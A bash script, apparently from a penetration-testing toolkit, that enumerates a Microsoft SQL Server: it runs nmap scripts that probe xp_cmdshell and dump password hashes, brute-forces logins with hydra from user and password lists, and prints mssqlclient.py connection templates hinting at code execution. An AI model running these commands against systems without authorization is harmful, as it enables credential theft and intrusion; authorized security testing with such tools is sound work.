#!/bin/bash

# No Color

NC='\033[0m'

# Regular Colors

Purple='\033[0;35m'       # Purple
White='\033[0;37m'        # White
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue

# Bold

BRed='\033[1;31m'         # Red
BGreen='\033[1;32m'       # Green
BYellow='\033[1;33m'      # Yellow
BBlue='\033[1;34m'        # Blue
BPurple='\033[1;35m'      # Purple
BWhite='\033[1;37m'       # White

# Underline
URed='\033[4;31m'         # Red
UGreen='\033[4;32m'       # Green
UYellow='\033[4;33m'      # Yellow
UBlue='\033[4;34m'        # Blue
UPurple='\033[4;35m'      # Purple
UWhite='\033[4;37m'       # White

# Background

On_Red='\033[41m'         # Red
On_Green='\033[42m'       # Green
On_Yellow='\033[43m'      # Yellow
On_Blue='\033[44m'        # Blue
On_Purple='\033[45m'      # Purple
On_White='\033[47m'       # White



while getopts i:p:U:C:u:P: flag
do
    case "${flag}" in
        i) ip=${OPTARG};;
        p) port=${OPTARG};;
	U) users=${OPTARG};;
	C) passs=${OPTARG};;
	u) user=${OPTARG};;
	P) password=${OPTARG};;
    esac
done

echo -e "\n${BPurple}MSSQL Enumeration${NC}"
echo -e "\n${Red}Before running this script make sure you have cloned repository from github. This script hugely depends on other files and file structure.\nAlso you need python3 to run one of the checks.${NC}"

echo -e "${BWhite}\n\nNMAP huge scan:${NC}"
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=$port,mssql.username=$user,mssql.password=$password -sV -p $port $ip


echo -e "${BWhite}\n\nBrute force using hydra:${NC}"
hydra -L $users -P $passs $ip mssql -vV -I -u


echo -e "${BWhite}\n\nConnect using credentials:${NC}"
echo -e "mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>\n${BWhite}or${NC}"
echo -e "mssqlclient.py <USER>:<PASSWORD>@<IP>"
echo -e "${BBlue}\n!! You may achieve code execution !!${NC}"






